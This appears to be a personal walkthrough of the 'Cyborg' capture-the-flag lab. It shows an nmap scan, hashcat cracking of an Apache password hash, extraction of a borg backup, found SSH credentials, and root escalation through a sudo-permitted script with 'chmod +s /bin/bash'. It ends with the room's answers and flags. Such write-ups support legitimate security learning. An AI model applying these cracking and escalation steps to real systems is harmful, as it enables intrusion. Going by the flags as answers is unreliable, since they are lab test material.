# Cyborg....

First of all a simple nMap scan

nmap -sC -sV -oN nScan 10.10.116.186 -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 03:19 EDT
Nmap scan report for 10.10.116.186
Host is up (1.8s latency).
Not shown: 520 filtered tcp ports (no-response), 478 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.61 seconds

Next up is Gobuster Scan


Firstly there was a /etc  where i found passwd and squid.conf
in the password i had a hash which was "$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn."
Saved it in a hash.txt file and ran hashcat


hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 7735HS with Radeon Graphics, 2192/4448 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Sun Jul 20 03:37:29 2025 (2 secs)
Time.Estimated...: Sun Jul 20 03:37:31 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    21168 H/s (8.94ms) @ Accel:64 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 39168/14344385 (0.27%)
Rejected.........: 0/39168 (0.00%)
Restore.Point....: 38912/14344385 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#1....: treetree -> lynnlynn
Hardware.Mon.#1..: Util: 96%

Started: Sun Jul 20 03:36:51 2025
Stopped: Sun Jul 20 03:37:33 2025


Boom we have a password that is 'squidward'

In that passwd file it had
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

that means the username is music_archive and password is squidward


Than i found an /admin page...
I went there and after a bit of poking arround i got a download section with a archive.tar file ??
I did wget it into the directory

extract it with 
tar -xvf archive.tar

now i got whole backup of the borg 

install borg by sudo apt install borgbackup

then do borg extract /home/kali/THM/CyBorg/home/field/dev/final_archive::music_archive   >> here music_archive is the user we found and also its passwd protected so that hash we cracked is its password

and now we got a home  directory

In /home/alex/Documents directory i found a note.txt which has

user and passwords
alex:S3cretP@s3


SSH into the box and boom now we have user.txt


and on running sudo -l i found

Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

in the backup.sh file i saw that it was taking a cmd on -c and that script was running it as root and to check it i did 

sudo /etc/mp3backups/backup.sh -c id

and got output as 
Backup finished
uid=0(root) gid=0(root) groups=0(root)

so for privilledge escallation 


sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"



and booom we are Root 


# Task 1   Deploy the machine


# Task 2   Compromise the system


1. Scan the machine, how many ports are open?
'''
2
'''

2. What service is running on port 22?
'''
SSH
'''

3. What service is running on port 80?
'''
HTTP
'''

4. What is the user.txt flag?
'''
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
'''

5. Waht is the root.txt flag?
'''
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
'''

